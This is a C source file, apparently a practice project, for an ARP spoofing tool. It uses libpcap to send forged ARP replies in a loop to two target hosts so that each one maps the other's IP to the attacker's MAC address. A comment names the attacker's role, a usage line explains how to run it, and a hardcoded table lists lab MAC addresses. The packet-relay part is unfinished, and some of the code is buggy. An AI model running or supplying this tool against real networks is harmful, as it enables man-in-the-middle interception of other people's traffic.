#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/if_ether.h>
#include <pcap.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <unistd.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <net/if.h>
#include <arpa/inet.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/ether.h>	     // for either_ntoa
#include <netinet/if_ether.h>    // for ehter sturcture
#include <netinet/ip.h>    		 // for ip structure
#include <netinet/tcp.h>




#define ARP_BROAD "\xff\xff\xff\xff\xff\xff"
#define ARP_DEFAULT_TMAC "\x00\x00\x00\x00\x00\x00"


u_char* _get_mymac(u_char *dev_str);
u_char* _get_myip(u_char *dev_str);
u_char* _ip_string_to_bytes(u_char *ip_str);
void _send_arp(u_char *dev_str,u_char *dst_mac,u_char *src_mac,u_char *sender_mac,u_char *sender_ip,u_char *target_mac,u_char *target_ip,u_short _opcode);
u_char* _detect_mac(u_char *dev_str,u_char *chk_ip);
u_char* thread_detect_mac(u_char *chk_ip);
u_char* mapping_table(u_char *chk_ip);
u_char* thread_relay(u_char *dev_str);
u_char* _mac_string_to_bytes(u_char *c_mac);


//GLOBAL
static u_char dev_str[80];
static u_char ip_str1[80];
static u_char ip_str2[80];
const u_char *_mymac;
u_char *_myip;
u_char *target_mac_1;
u_char *target_mac_2;
u_char *target_mac_str1;
u_char *target_mac_str2;


int main(int argc, char *argv[]){
//START: error HOW TO USE
	printf("=====START========\n");
	if(argc<3){
		printf("[How to use]: ./[exec file] [NIC] [A1_target_ip] [A2_target_ip] (...[B1_target_ip] [B2_target_ip])");
		return -1;
	}
//START: ARGUMENT	
	//static u_char dev_str[80];
	strcpy(dev_str,argv[1]);
	//static u_char ip_str1[80];
	strcpy(ip_str1,argv[2]);
	//static u_char ip_str2[80];
	strcpy(ip_str2,argv[3]);
	printf("==================\n");
	setbuf(stdin,NULL);
	setbuf(stdout,NULL);
//START: MY MAC
	_mymac=_get_mymac(dev_str);

//START: MY IP
	_myip=_get_myip(dev_str);
	printf("==================\n");
//START: SPOOFING BOTH
	



	int m;
	while(1){
		printf("=======================[%d]======================",m++);
		target_mac_str1=mapping_table(ip_str1);
		target_mac_1=_mac_string_to_bytes(target_mac_str1);
		_mymac=_get_mymac(dev_str);

		printf("\ndev_str: %s\n",dev_str);
		printf("DST mac: ");
		for(int i=0; i<6;i++){
			printf("[%02x]",target_mac_1[i]);
		} printf("\n");
		printf("SRC mac: ");
		for(int i=0; i<6;i++){
			printf("[%02x]",_mymac[i]);
		} printf("\n");
		printf("Sender mac: ");
		for(int i=0; i<6;i++){
			printf("[%02x]",_mymac[i]);
		} printf("\n");
		printf("Sender ip: %s\n",ip_str2);
		printf("Target mac: ");
		for(int i=0; i<6;i++){
			printf("[%02x]",target_mac_1[i]);
		} printf("\n");
		printf("Target ip: %s\n\n",ip_str1);

		_send_arp(dev_str,target_mac_1,_mymac,_mymac,ip_str2,target_mac_1,ip_str1,0x002);
		sleep(2);

		target_mac_str2=mapping_table(ip_str2);
		target_mac_2=_mac_string_to_bytes(target_mac_str2);
		_mymac=_get_mymac(dev_str);

		printf("\ndev_str: %s\n",dev_str);
		printf("DST mac: ");
		for(int i=0; i<6;i++){
			printf("[%02x]",target_mac_2[i]);
		} printf("\n");
		printf("SRC mac: ");
		for(int i=0; i<6;i++){
			printf("[%02x]",_mymac[i]);
		} printf("\n");
		printf("Sender mac: ");
		for(int i=0; i<6;i++){
			printf("[%02x]",_mymac[i]);
		} printf("\n");
		printf("Sender ip: %s\n",ip_str1);
		printf("Target mac: ");
		for(int i=0; i<6;i++){
			printf("[%02x]",target_mac_2[i]);
		} printf("\n");
		printf("Target ip: %s\n",ip_str2);

		_send_arp(dev_str,target_mac_2,_mymac,_mymac,ip_str1,target_mac_2,ip_str2,0x002);	
		sleep(2);
	}
	
//	printf("target mac str1 : %s \n",target_mac_str1);
//	printf("target mac str2 : %s \n",target_mac_str2);

	for(int i=0; i<6;i++){
		printf("[%02x]",target_mac_2[i]);
	}

	// A to C spoof , B is  attacker

	// C to A spoof


/*
	pthread_t t_id;
	u_char thread_param=0;
	u_char *thr_ret;
	pthread_create(&t_id,NULL,thread_relay,dev_str);
*/
/*
	while(1){		
		_send_arp(dev_str,ARP_BROAD,_mymac,argv_ip[0],_myip,ARP_DEFAULT_TMAC,_mymac,0x0001);
		pthread_join(t_id,&argv_mac[0]);	
		if(argv_mac[0]!=NULL){
			printf("NULL00\n");
			break;
		}
	}
*/
	return 0;
}


u_char *_mac_string_to_bytes(u_char *in_mac){
	char c_mac[80];
	strcpy(c_mac,in_mac);
	const char s2[2]=":";
	char *token2;
	static u_char t_mac[6];

	int i=0;
	token2=strtok(c_mac,s2);                
	int k=0;
	while( token2 != NULL ) 
	{
//	  printf( "*%s ", token2 );
	  t_mac[k]=strtol(token2,NULL,16);
	  k++;
	  token2 = strtok(NULL, s2);
	  //printf(" k : %d, mac[%d]: %x \n",k,k,t_mac[k]);
	}
	return t_mac;
}

u_char* mapping_table(u_char *chk_ip){
//WATNED IT MADE BY
//1.ARP REQUEST - FAILED: GRATUIOUS 
//2."arp -a", READ IT  - FAILED 
	static u_char *arp_table[6]={"192.168.246.2","00:50:56:c0:00:08",
			 					"192.168.246.135","00:0c:29:ff:61:71",
								"192.168.246.254","00:50:56:e6:ed:9a" };
	static u_char ret_mac[6];

	for(int i=0; i<6; i+=2){
		if(strcmp(chk_ip,arp_table[i])==0){
			//printf("chk_ip: %s\n",chk_ip);
			//printf("table_ip: %s\n",arp_table[i]);
			//printf("pair_mac: %s\n",arp_table[i+1]);
			strcpy(ret_mac,arp_table[i+1]);
			//printf("ret_mac: %s\n",ret_mac);
			return ret_mac;
		}
	}
	printf("no data\n");
	return 1;
}



u_char* thread_relay(u_char *dev_str){
	pcap_t *handle;
	u_char *packet;
	int chk_packet;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct pcap_pkthdr *header;
	struct ether_header *_eth=(struct ether_header*)(packet);
	struct ip *_ip=(struct ip*)(packet+sizeof(struct ether_header));

	
	handle = pcap_open_live(dev_str, BUFSIZ, 1, 1000, errbuf);
	while(1){
		chk_packet = pcap_next_ex(handle, &header,&packet);
		if(chk_packet==0){
				printf("chk_packet=0\n");
				return -1;
		}
		else if(chk_packet==1){
			printf("ip_src: %s\n",_ip->ip_src);
			printf("ip_dst: %s\n",_ip->ip_dst);
			
		}
		else{
			printf("ck_packout wrong -1(Device down) or -2(EOF)\n");
			return -1;
		}
	}
    return 0;
}


u_char* _get_mymac(u_char *dev_str){
	static u_char __mymac[6];
	int _s;
    struct ifreq ifr;
    _s = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, dev_str);
    ioctl(_s, SIOCGIFHWADDR, &ifr);
    
    for(int i=0; i<6; i++)
        __mymac[i]=((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
/*
    printf("_get_mymac : ");
    for(int i=0; i<6; i++){
        printf("[%02x]",__mymac[i]);
    } printf("\n");
*/
    return __mymac;
}
u_char* _get_myip(u_char *dev_str){
	struct ifaddrs *ifaddr, *ifa;
    int family, s;
    char host[NI_MAXHOST];  // defined  NI_MAXHOST==1025
    
    if (getifaddrs(&ifaddr) == -1) 
    {
        perror("getifaddrs");
        return -1;
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) 
    {
        if (ifa->ifa_addr == NULL)
            continue;  

        s=getnameinfo(ifa->ifa_addr,sizeof(struct sockaddr_in),host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);

        if((strcmp(ifa->ifa_name,dev_str)==0)&&(ifa->ifa_addr->sa_family==AF_INET))
        {
            if (s != 0)
            {
                printf("getnameinfo() failed: %s\n", gai_strerror(s));
                return -1;
            }
            //printf("\nInterface : <%s>\n",ifa->ifa_name );
            //printf("Address : <%s>\n", host); 
        }
    }

    freeifaddrs(ifaddr);
    return _ip_string_to_bytes(host);
}
u_char* _ip_string_to_bytes(u_char *ip_str){
	static u_char _ip[4];
	const char tk[2] = ".";	
	char *token;

	int i=0;
	token = strtok(ip_str, tk);
	while( token != NULL ) 
	{
	  _ip[i++]=atoi(token);
	  token = strtok(NULL, tk);
	}

	printf("IP: ");
	for(int i=0; i<4; i++){
		printf("%d",_ip[i]);
		if(i<3) printf(".");
	} printf("\n");
	
	return  _ip;
}
void _send_arp(u_char *dev_str,u_char *dst_mac,u_char *src_mac,u_char *sender_mac,u_char *sender_ip,u_char *target_mac,u_char *target_ip,u_short _opcode){
	u_char buffer[80];
    struct ether_header *_eth=(struct ether_header*)buffer;
    struct ether_arp *_arp=(struct ether_arp*)(buffer+sizeof(struct ether_header));
 
    //ETHER HEADER
    memcpy(_eth->ether_dhost, dst_mac, 6);
 	memcpy(_eth->ether_shost, src_mac, 6);
 	_eth->ether_type=htons(ETHERTYPE_ARP);//htons(ETHERTYPE_ARP);
 	// ARP HEADER
    _arp->arp_hrd=htons(0x0001);//htons(0x0001)
    _arp->arp_pro=htons(0x0800);//htons(0x0008)
    _arp->arp_hln=0x06;
    _arp->arp_pln=0x04;
    _arp->arp_op=htons(_opcode);//htons(0x0001)
    memcpy(_arp->arp_sha, sender_mac,6);
    memcpy(_arp->arp_spa, sender_ip,4);
    memcpy(_arp->arp_tha, target_mac,6);
    memcpy(_arp->arp_tpa, target_ip,4);
/*
    for(int i=0; i<sizeof(struct ether_header)+sizeof(struct ether_arp); i++){
    	if(i%16==0) printf("\n");
    	printf("[%02x]",buffer[i]);
    } printf("\n");
*/
	pcap_t *s_handle;
	u_char *s_packet;
	struct pcap_pkthdr *header;
	char errbuf[PCAP_ERRBUF_SIZE];

	if (dev_str == NULL) { fprintf(stderr, "Couldn't find default device: %s\n", errbuf); return(2); }
	s_handle = pcap_open_live(dev_str, BUFSIZ, 1, 1000, errbuf);
	if (s_handle == NULL) { fprintf(stderr, "Couldn't open device %s: %s\n", dev_str, errbuf); return(2); }
    pcap_sendpacket(s_handle, buffer, sizeof(struct ether_header)+sizeof(struct ether_arp));
}
u_char* _detect_mac(u_char *dev_str,u_char *chk_ip){
	pcap_t *handle;
	u_char *packet;
	int chk_packet;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct pcap_pkthdr *header;
	static u_char *get_mac;
	handle = pcap_open_live(dev_str, BUFSIZ, 1, 1000, errbuf);
	while(1){
		chk_packet = pcap_next_ex(handle, &header,&packet);
		if(chk_packet==0){
				printf("chk_packet=0\n");
				return -1;
		}
		else if(chk_packet==1){
			struct ether_header *_eth=(struct ether_header*)(packet);
			struct ether_arp *_arp=(struct ether_arp*)(packet+sizeof(struct ether_header));

			if(ntohs(_eth->ether_type)==0x0806&&ntohs(_arp->arp_op)==0x0002&&(strcmp(_arp->arp_spa,chk_ip)!=0)){
				printf("*GET ARP REPLY*\n");
					return get_mac=_arp->arp_sha;
				
			}
		}
		else{
			printf("ck_packout wrong -1(Device down) or -2(EOF)\n");
			return -1;
		}
	}
    return 0;
}

